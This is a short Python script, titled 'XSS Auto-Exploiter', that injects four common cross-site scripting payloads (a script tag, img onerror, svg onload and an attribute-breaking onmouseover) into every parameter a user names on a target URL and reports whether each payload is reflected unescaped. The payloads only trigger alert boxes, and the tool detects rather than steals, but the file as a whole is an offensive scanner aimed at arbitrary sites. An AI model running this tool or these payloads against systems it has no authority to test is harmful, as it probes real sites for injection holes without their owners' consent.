import requests
import argparse
from urllib.parse import urljoin

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "' onmouseover=alert('XSS') "
]

def test_xss(url, params):
    """Injects XSS payloads into each parameter and checks for execution."""
    for payload in XSS_PAYLOADS:
        test_params = {key: payload for key in params}
        response = requests.get(url, params=test_params)
        
        if payload in response.text:
            print(f"[!] Potential XSS Detected: {url} with payload {payload}")
        else:
            print(f"[-] No XSS detected with payload: {payload}")

def main():
    parser = argparse.ArgumentParser(description="XSS Auto-Exploiter")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--params", nargs='+', required=True, help="Parameter names to inject XSS payloads")
    args = parser.parse_args()
    
    print("[+] Scanning for XSS...")
    test_xss(args.url, args.params)
    print("[+] Scan Complete!")

if __name__ == "__main__":
    main()
